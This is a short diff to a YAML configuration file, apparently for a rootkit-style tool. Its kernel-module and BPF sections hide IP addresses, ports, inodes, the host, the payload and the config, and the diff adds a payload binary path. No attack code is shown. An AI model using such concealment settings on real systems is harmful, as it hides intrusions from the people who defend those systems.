@@ -5,7 +5,7 @@ kernel_module_config:
   # Ip addresses and ports to hide
   ips_and_ports: 
     # - ip: <example ip>
-    #   port: <example port>
+    # - port: <example port>
 
 bpf_program_config:
   # Additional inodes to hide
@@ -14,3 +14,6 @@ bpf_program_config:
   hide_host: true
   hide_payload: true
   hide_config: true
+
+payload:
+  path: ./bin/payload
